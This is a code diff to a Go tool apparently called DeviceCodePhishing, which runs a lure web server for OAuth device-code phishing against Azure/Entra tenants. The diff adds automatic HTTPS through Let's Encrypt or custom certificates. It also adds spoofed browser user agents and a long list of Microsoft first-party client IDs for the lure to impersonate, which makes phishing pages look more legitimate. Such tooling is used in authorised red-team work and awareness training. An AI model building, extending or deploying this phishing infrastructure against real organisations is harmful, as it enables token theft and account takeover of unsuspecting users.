@@ -13,6 +13,8 @@ import (
 	"github.com/denniskniep/DeviceCodePhishing/pkg/entra"
 	"github.com/denniskniep/DeviceCodePhishing/pkg/utils"
 	"github.com/spf13/cobra"
+
+	"golang.org/x/crypto/acme/autocert"
 )
 
 const EdgeOnWindows string = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0"
@@ -112,6 +114,9 @@ var (
 	customClientId  string
 	tenant          string
 	pathPrefix      string
+	domain          string
+	certFile        string
+	keyFile         string
 )
 
 func init() {
@@ -123,6 +128,9 @@ func init() {
 	runCmd.Flags().StringVar(&customClientId, "custom-client-id", "", "Custom ClientId (full GUID)")
 	runCmd.Flags().StringVarP(&tenant, "tenant", "t", DefaultTenant, "Azure tenant to target")
 	runCmd.Flags().StringVarP(&pathPrefix, "path", "p", "", "Custom path for the lure URL (e.g., /custom) - default is /lure")
+	runCmd.Flags().StringVarP(&domain, "domain", "d", "", "Domain name for automatic HTTPS (uses Let's Encrypt)")
+	runCmd.Flags().StringVar(&certFile, "cert", "", "Certificate file for HTTPS (also requires --key)")
+	runCmd.Flags().StringVar(&keyFile, "key", "", "Key file for HTTPS (also requires --cert)")
 }
 
 var runCmd = &cobra.Command{
@@ -147,24 +155,69 @@ Available User-Agent options for --user-agent:
   chrome-ios            - Chrome on iOS
   safari-ios            - Safari on iOS
   firefox-ios           - Firefox on iOS
+  firefox-linux         - Firefox on Linux
+  chrome-linux          - Chrome on Linux
+  edge-linux            - Edge on Linux
+  brave-linux           - Brave on Linux
+  vivaldi-linux         - Vivaldi on Linux
+  opera-linux           - Opera on Linux
+  chromium-linux        - Chromium on Linux
+  konqueror-linux       - Konqueror on Linux
+  firefox-os2           - Firefox on OS/2
+  seamonkey-os2         - SeaMonkey on OS/2
+  chromplus-os2         - ChromePlus on OS/2
+  qt-browser-os2        - Qt Browser on OS/2
+  netfront-os2          - NetFront on OS/2
 
 Available ClientId options for --client-id:
   msauthbroker          - Microsoft Authentication Broker (default)
   office365             - Office 365 Management
   azurecli              - Microsoft Azure CLI
+  officeuwa             - Office UWP PWA
+  msdocs                - Microsoft Docs
   azurepowershell       - Microsoft Azure PowerShell
+  windowsspotlight      - Windows Spotlight
+  aadpowershell         - Azure Active Directory PowerShell
   msteams               - Microsoft Teams
+  mstodo                - Microsoft To-Do client
+  universalstore        - Universal Store Native Client
   winsearch             - Windows Search
   outlook               - Outlook Mobile
+  bingsearch            - Microsoft Bing Search for Microsoft Edge
   authenticator         - Microsoft Authenticator App
-  onedrive              - OneDrive SyncEngine
-  office                - Microsoft Office
-  visualstudio          - Visual Studio
-  onedriveios           - OneDrive iOS App
-  bingsearch            - Microsoft Bing Search for Edge
+  powerapps             - PowerApps
+  whiteboard            - Microsoft Whiteboard Client
+  flow                  - Microsoft Flow Mobile
+  roamingbackup         - Enterprise Roaming and Backup
+  planner               - Microsoft Planner
   stream                - Microsoft Stream Mobile Native
+  visualstudio          - Visual Studio - Legacy
   teamsadmin            - Microsoft Teams - Device Admin Agent
+  aadrmpowershell       - Aadrm Admin PowerShell
+  intune                - Microsoft Intune Company Portal
+  sporemote             - Microsoft SharePoint Online Management Shell
+  exchangepowershell    - Microsoft Exchange Online Remote PowerShell
+  accountcontrol        - Accounts Control UI
+  yammerphone           - Yammer iPhone
+  onedrive              - OneDrive Sync Engine
+  onedriveios           - OneDrive iOS App
+  ondriveconsumer       - OneDrive (Consumer)
+  aadjcsp               - AADJ CSP
+  powerbi               - Microsoft Power BI
+  spoextension          - SharePoint Online Client Extensibility
+  aadconnect            - Microsoft Azure AD Connect
   bing                  - Microsoft Bing Search
+  sharepoint            - SharePoint
+  office                - Microsoft Office
+  outlooklite           - Outlook Lite
+  modernedge            - Microsoft Edge (Modern)
+  tunnel                - Microsoft Tunnel
+  edgemobile            - Microsoft Edge (Mobile)
+  spandroid             - SharePoint Android
+  dynamics365           - Media Recording for Dynamics 365 Sales
+  edgewebview           - Microsoft Edge (WebView)
+  exchangerest          - Microsoft Exchange REST API Based PowerShell
+  intuneagent           - Microsoft Intune Windows Agent
 
 Examples:
   # Using predefined options
@@ -176,13 +229,17 @@ Examples:
   # With custom path (URL will be /auth)
   DeviceCodePhishing server --path /auth --client-id azurecli
   
-  # With custom user agent
-  DeviceCodePhishing server --custom-user-agent "Mozilla/5.0..." --client-id office365
+  # With automatic HTTPS (Let's Encrypt)
+  DeviceCodePhishing server --domain example.com --client-id office365
   
-  # Default path (URL will be /lure)
-  DeviceCodePhishing server --client-id msteams
+  # With custom SSL certificates
+  DeviceCodePhishing server --cert cert.pem --key key.pem --client-id msteams
+  
+  # HTTPS on custom port
+  DeviceCodePhishing server --address :8443 --domain example.com
 
-Note: Cannot specify both --client-id and --custom-client-id simultaneously`,
+Note: Cannot specify both --client-id and --custom-client-id simultaneously
+Note: Cannot use --domain with --cert/--key (use one SSL method only)`,
 	Run: func(cmd *cobra.Command, args []string) {
 		// Determine which user agent to use
 		finalUserAgent := customUserAgent
@@ -252,6 +309,31 @@ Note: Cannot specify both --client-id and --custom-client-id simultaneously`,
 			Addr: address,
 		}
 
+		// Configure SSL/TLS if requested
+		isHTTPS := false
+		protocol := "http"
+		if domain != "" && (certFile != "" || keyFile != "") {
+			slog.Error("Cannot use both --domain and --cert/--key simultaneously")
+			os.Exit(1)
+		}
+
+		if domain != "" || (certFile != "" && keyFile != "") {
+			isHTTPS = true
+			protocol = "https"
+
+			// If using Let's Encrypt, typically run on port 443
+			if domain != "" && address == ":8080" {
+				address = ":443"
+				server.Addr = address
+				// Re-parse the address
+				host, port, err = net.SplitHostPort(address)
+				if err != nil || port == "" {
+					slog.Error("Invalid address format", "address", address, "error", err)
+					os.Exit(1)
+				}
+			}
+		}
+
 		slog.Info("Start Server",
 			"tenant", tenant,
 			"clientId", finalClientId,
@@ -261,16 +343,37 @@ Note: Cannot specify both --client-id and --custom-client-id simultaneously`,
 			host = "localhost"
 		}
 
-		slog.Info("Lure available at", "url", "http://"+host+":"+port+lurePath)
+		slog.Info("Lure available at", "url", protocol+"://"+host+":"+port+lurePath)
 
 		// Attempt to get public IP
 		publicIP := getPublicIP()
 		if publicIP != "" {
-			slog.Info("Public URL", "url", "http://"+publicIP+":"+port+lurePath)
+			slog.Info("Public URL", "url", protocol+"://"+publicIP+":"+port+lurePath)
 		}
 
-		// Listen to HTTP connections and wait
-		log.Fatal(server.ListenAndServe())
+		if domain != "" {
+			slog.Info("Using automatic HTTPS with Let's Encrypt", "domain", domain)
+		}
+
+		// Start the server
+		if isHTTPS {
+			if domain != "" {
+				// Use Let's Encrypt for automatic HTTPS
+				certManager := autocert.Manager{
+					Prompt:     autocert.AcceptTOS,
+					HostPolicy: autocert.HostWhitelist(domain),
+					Cache:      autocert.DirCache("certs"),
+				}
+				server.TLSConfig = certManager.TLSConfig()
+				log.Fatal(server.ListenAndServeTLS("", ""))
+			} else {
+				// Use custom certificates
+				log.Fatal(server.ListenAndServeTLS(certFile, keyFile))
+			}
+		} else {
+			// HTTP only
+			log.Fatal(server.ListenAndServe())
+		}
 	},
 }
 
